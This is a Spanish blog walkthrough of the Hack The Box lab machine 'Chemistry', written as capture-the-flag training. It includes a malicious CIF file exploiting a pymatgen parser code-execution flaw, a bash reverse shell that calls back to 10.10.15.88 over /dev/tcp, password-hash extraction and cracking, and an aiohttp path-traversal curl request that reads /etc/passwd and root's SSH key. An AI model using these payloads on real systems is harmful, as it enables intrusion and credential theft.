---
title: "CHEMISTRY HTB"
date: 2025-05-19 10:00:00 +0000
categories: [HackTheBox]
tags: [HackTheBox, CTF]
image: /assets/img/HackTheBox/MachineChemistry/chemistry_htb.png
---


Chemistry es una máquina de nivel fácil en Hack The Box que permite reforzar habilidades de reconocimiento, análisis web y explotación básica. Es ideal para quienes buscan practicar técnicas de carga de archivos, enumeración y post-explotación en entornos Linux.


## INFORMACIÓN GENERAL

- **Plataforma**: HackTheBox
- **Sistema Operativo**: Linux
- **Dificultad**: Fácil
- **IP Attack**: 10.10.11.38


## RECONOCIMIENTO
Vamos a empezar tranquilo haciendo un ping a la maquina y tenemos conexión, de todas maneras el TTL(time to live) nos informa que es una maquina Linux
![ping](/assets/img/HackTheBox/MachineChemistry/ping.png)

Procedemos con un escaneo de puertos abiertos con `nmap`

```bash
nmap -p- -sS --min-rate 5000 -vvv -n -Pn -sCV 10.10.11.38 
```
```bash
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Tue, 11 Mar 2025 04:48:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

De momento no hay nada que nos llame la atencion, solo una pagina web que alberga el puerto 5000, podemos echar un ojo a ver que tenemos 

![web_5000](/assets/img/HackTheBox/MachineChemistry/web_5000.png/)

OK, entonces la web nos dice que:

>[+]
> Bienvenido al Analizador CIF Chemistry. Esta herramienta le permite cargar un CIF (archivo de información cristalográfica) y analizar los datos estructurales contenidos.
>

Entonces nos da una pista que podemos subir un archivo CIF, si queremos descubrir algunos directorios ocultos con `Gobuster` no vamos a poder, entonces vamos a probar registrarse a ver que tenemos

![registrado_web](/assets/img/HackTheBox/MachineChemistry/registrado_web.png)

Podemos observar que, tenemos una Dashboard de subida del archivo CIF, si probamos con otras extensiones no tendremos éxito, y la pagina menciona que nos provee un archivo CIF para analizarlo, vamos a ver que tenemos, o de que manera se estructura
![example_cif](/assets/img/HackTheBox/MachineChemistry/example_cif.png)

![estructura_example](/assets/img/HackTheBox/MachineChemistry/estructura_example.png)

## EXPLOTACIÓN

Al parecer tiene ciertos parámetros que se interprestan, podemos revisar en internet si existen archivos CIF maliciosos
OK, consultando con varias fuentes en Internet tenemos el siguiente CIF malicioso que analizaremos:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
>[+]Exploit de ejecución de código arbitrario:
>
>El exploit descrito en el _space_group_magn.transform_BNS_Pp_abc es un intento de ejecución de código arbitrario dentro de un archivo CIF al utilizar el Pymatgen CIF Parser. Este parser tiene la capacidad de procesar datos de archivos CIF, pero también podría estar vulnerable a inyecciones de código si no se maneja adecuadamente el contenido del archivo.

Basicamente entonces lo que hace es ejecutar un codigo arbitrario aprovechandose de la mala sanitización de código, probaremos remplazar el contenido de `os.system` para ver si nos podemos entablar una `reverse shell`, creamos el archivo `pwned.cif` que tendrá de contenido lo siguiente:
```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.15.88/1234 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

>[+] Recomendacion
>
>Cambiar Ip y Puerto de escucha de la `reverse shell`
>
>Haciendo pruebas me di cuenta que la `bash` no se ejecuta si no pones `la ruta absoluta`.
>
>Tambien se deje escapar las comillas simples para evitar conflictos.
>

Nos ponemos en modo Listening en nuestra maquina Atacante Local con `NetCat`
```bash
nc -nlvp 1234
```

![pwned_cif](/assets/img/HackTheBox/MachineChemistry/pwned_cif.png)

Una vez subido el archivo le damos en `view`, que es la opcion donde hace la ejecución y veremos que se nos queda cargando la pagina

![cargando_page](/assets/img/HackTheBox/MachineChemistry/cargando_page.png)

Nos fijamos si recibio la solicitud `NetCat`
![reverse_shell](/assets/img/HackTheBox/MachineChemistry/reverse_shell.png)

Y vemos que hemos obtenido una reverse shell, para hacer mas interactiva vamos a realizar el tratamiento de la TTY:

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo:fg
        reset xterm
export TERM=xterm
export SHELL=bash
```

De primera nos encontamos a app.py, que echandole un ojo nos informa lo siguiente:

![sqlite](/assets/img/HackTheBox/MachineChemistry/sqlite.png)
La base de datos que se esta utilizando es una `sqlite`.

Si seguimos revisando especificamente en el directorio `instance`, podemos ver 2 archivos interesantes, que es `database.db` que es una base de datos, el cual podemos abrir con `sqlite3`, tambien observamos `dump.txt` que contiene lo siguiente:
![dump](/assets/img/HackTheBox/MachineChemistry/dump.png)

Podemos observar la creación de 2 tablas de nombres `estructure` y `user`, en la tabla `user` se ingresaron usuarios con las contraseñas respectivamente hasheadas, podemos crackearlas, pero primero haremos un filtrado:

```bash
echo 'INSERT INTO user VALUES(1,"admin","2861debaf8d99436a10ed6f75a252abf");
INSERT INTO user VALUES(2,"app","197865e46b878d9e74a0346b6d59886a");
INSERT INTO user VALUES(3,"rosa","63ed86ee9f624c7b14f1d4f43dc251a5");
INSERT INTO user VALUES(4,"robert","02fcf7cfc10adc37959fb21f06c6b467");
INSERT INTO user VALUES(5,"jobert","3dec299e06f7ed187bac06bd3b670ab2");
INSERT INTO user VALUES(6,"carlos","9ad48828b0955513f7cf0f7f6510c8f8");
INSERT INTO user VALUES(7,"peter","6845c17d298d95aa942127bdad2ceb9b");
INSERT INTO user VALUES(8,"victoria","c3601ad2286a4293868ec2a4bc606ba3");
INSERT INTO user VALUES(9,"tania","a4aa55e816205dc0389591c9f82f43bb");
INSERT INTO user VALUES(10,"eusebio","6cad48078d0241cca9a7b322ecd073b3");
INSERT INTO user VALUES(11,"gelacia","4af70c80b68267012ecdac9a7e916d18");
INSERT INTO user VALUES(12,"fabian","4e5d71f53fdd2eabdbabb233113b5dc0");
INSERT INTO user VALUES(13,"axel","9347f9724ca083b17e39555c36fd9007");
INSERT INTO user VALUES(14,"kristel","6896ba7b11a62cacffbdaded457c6d92");
INSERT INTO user VALUES(15,"test","098f6bcd4621d373cade4e832627b4f6");
INSERT INTO user VALUES(16,"user","ee11cbb19052e40b07aac0ca060c23ee");' | grep -oP '"\K[a-f0-9]{32,}'
```
esto nos devolvera unicamente los hashes:

```bash
2861debaf8d99436a10ed6f75a252abf
197865e46b878d9e74a0346b6d59886a
63ed86ee9f624c7b14f1d4f43dc251a5
02fcf7cfc10adc37959fb21f06c6b467
3dec299e06f7ed187bac06bd3b670ab2
9ad48828b0955513f7cf0f7f6510c8f8
6845c17d298d95aa942127bdad2ceb9b
c3601ad2286a4293868ec2a4bc606ba3
a4aa55e816205dc0389591c9f82f43bb
6cad48078d0241cca9a7b322ecd073b3
4af70c80b68267012ecdac9a7e916d18
4e5d71f53fdd2eabdbabb233113b5dc0
9347f9724ca083b17e39555c36fd9007
6896ba7b11a62cacffbdaded457c6d92
098f6bcd4621d373cade4e832627b4f6
ee11cbb19052e40b07aac0ca060c23ee
```

ahora si podemos ir a [CrackStation](https://crackstation.net/)
tenemos la password `unicorniosrosados`, que de cierta manera nos hace pensar que es la password del user `rosa`, podemos migrar de usuario y entrar a su carpeta de usuario para encontrarnos con la primera flag
## PRIMERA FLAG
![flag.txt](/assets/img/HackTheBox/MachineChemistry/flag.txt.png)

## ESCALADA DE PRIVILEGIOS 

Para poder intentar escalar privilegios desde el usuario `rosa`, si intemos por `sudo -l`, `suid`, `capabilities` no tendremos éxito 
Pero, si listamos procesos con 
```bash
ps -faux
```
encontramos lo siguiente:
![faux](/assets/img/HackTheBox/MachineChemistry/faux.png) 

Al parecer el usuario root esta ejecurando un `app.py` con `python3.9`, parece ser un sitio web, lo podemos comprobar listando puertos abiertos para ver si hay alguno 

![ports_rosa](/assets/img/HackTheBox/MachineChemistry/portts_rosa.png)

Vemos que hay un puerto `8080`, y el otro `5000` es el que ya hemos pasado, para averiguar un poco, como no esta corriendo en local, podemos lanzar un 
```bash
curl localhost:8080
```
para ver detalles de la página, y un 
```bash
curl localhost:8080 -I 
```
Para ver las cabeceras de respuesta y aqui se viene lo interesante:

![cabecera](/assets/img/HackTheBox/MachineChemistry/cabecera.png)

Tenemos un servidor: `Python/3.9 aiohttp/3.9.1`, investigando vulnerabilidades sobre este servidor en internet nos encontramos con lo siguiente. una vulnerabilidad de LFI o Path Traversal, que se ejecuta mediante solicitud Get hacia un directorio existente:

![analiss_payload](/assets/img/HackTheBox/MachineChemistry/analisis_payload.png)

- **Este código construye un payload con 15 instancias de Path Traversal `/..`, significa que navegará hacia atras en el sistema 15 niveles**
- **El payload comienza con el valor de `dir` que es el directorio existente de la web ingresado por el usuario y para cada intento se agrega el `/..`**
- **Luego realiza peticion con método GET al servidor, que se compone por la `ruta del servidor` seguida por el `payload` y el archivo que se quiere leer `file`**
- **Si el código revisa que el estado HTTP es 200, significa que la solicitud fue exitosa, y el script imprime el contenido solicitado.**

Hacemos lo siguiente de acuerdo a este concepto:
**OJO: que el directorio existente que aloja la web lo vemos con la consulta de curl que esta arriba**

```bash
curl -s -X GET "http://localhost:8080/assets/../../../../../../../../../../../etc/passwd" --path-as-is
```
- **path-as-is** : esto se encarga de que el Path Traversal `../` lo contemple de manera correcta

![root_curl](/assets/img/HackTheBox/MachineChemistry/root_curl.png)

Una vez esto, podemos dirigirnos al directorio de root y averiguar si existe una clave privada para logearnos por ssh

![id_rsa_root](/assets/img/HackTheBox/MachineChemistry/id_rsa_root.png)

efectivamente, lo tenemos, copiamos esta clave y le damos permisos `chmod 600 id_rsa` solo de propietario
```bash
ssh -i id_rsa root@localhost
```
### SEGUNDA FLAG
![acceso_total](/assets/img/HackTheBox/MachineChemistry/acceso_total.png)

## HEMOS RESUELTO LA MAQUINA

# GRACIAS POR LEER



